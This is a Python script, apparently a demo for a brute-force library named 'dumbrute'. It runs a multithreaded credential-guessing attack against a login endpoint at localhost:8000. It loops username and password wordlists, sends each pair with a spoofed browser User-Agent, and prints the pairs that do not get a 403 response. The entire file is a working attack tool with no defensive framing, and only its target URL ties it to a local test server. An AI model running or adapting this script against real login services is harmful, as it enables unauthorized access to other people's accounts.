from dumbrute import Creds, read_file, start_brute_force
import requests

usernames = read_file("usernames.txt")
passwords = read_file("passwords.txt")

def make_request(creds: Creds):
    headers = {
        'Host': 'localhost:8000',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    response = requests.post(f'http://localhost:8000/login?username={creds.username}&password={creds.password}',
                             headers=headers, verify=False)
    if response.status_code != 403:
        print(f"{creds.username}:{creds.password}")


start_brute_force(
    usernames=usernames,
    passwords=passwords,
    function=make_request,
    threads=10
)
